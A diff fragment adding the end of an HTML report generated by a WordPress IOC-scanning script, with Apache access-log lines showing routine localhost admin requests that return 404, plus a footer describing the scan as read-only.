+172.20.0.1 - - [18/Jul/2026:07:21:29 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/theme-editor.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:21:32 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:21:35 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/plugins.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:23:30 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:23:31 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:23:40 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?src=apache_access&amp;n=500&amp;q&amp;method&amp;status&amp;ip&amp;orderby=time&amp;dir=asc&amp;page=lab-log-viewer" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:24:04 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer&amp;src=apache_access&amp;n=500&amp;q&amp;method&amp;status&amp;ip&amp;iocs=1&amp;orderby=time&amp;dir=asc" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"</pre></details>
+</section>
+</main>
+<footer>wp_ioc_scan.sh &middot; read-only IOC sweep &middot; FAIL = investigate now, WARN = review, INFO = context.
+Not a substitute for full forensic imaging on a confirmed compromise.</footer>
+</body></html>
